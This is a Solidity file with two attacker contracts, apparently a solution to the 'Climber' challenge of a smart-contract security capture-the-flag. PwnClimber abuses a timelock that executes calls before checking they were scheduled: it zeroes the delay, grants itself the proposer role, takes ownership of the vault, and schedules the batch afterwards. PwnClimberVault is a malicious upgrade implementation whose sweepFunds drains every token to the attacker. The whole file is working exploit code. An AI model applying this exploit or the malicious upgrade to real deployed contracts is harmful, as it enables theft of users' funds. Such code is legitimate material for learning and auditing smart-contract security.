// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "./ClimberTimelock.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PwnClimber {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    ClimberTimelock timelock;
    address vault;
    address us;

    constructor(
	address payable timelockAddress,
	address vaultAddress,
	address ourAddress
	) {
	timelock = ClimberTimelock(timelockAddress);
	vault = vaultAddress;
	us = ourAddress;
    }

    function gainOwnership() external {
	require(tx.origin == us);
	salt = "42";

	targets.push(address(timelock));
	dataElements.push(abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0));
	values.push(0);

	targets.push(address(timelock));
	dataElements.push(abi.encodeWithSelector(
	    AccessControl.grantRole.selector,
	    keccak256("PROPOSER_ROLE"),
	    address(this)
	));
	values.push(0);

	targets.push(vault);
	dataElements.push(abi.encodeWithSignature("transferOwnership(address)", us));
	values.push(0);

	targets.push(address(this));
	dataElements.push(abi.encodeWithSignature("schedule()"));
	values.push(0);

	timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
	require(tx.origin == us);
	timelock.schedule(targets, values, dataElements, salt);
    }
}

contract PwnClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() initializer external {
	__Ownable_init();
	__UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external onlyOwner {
	IERC20 token = IERC20(tokenAddress);
	require(token.transfer(owner(), token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
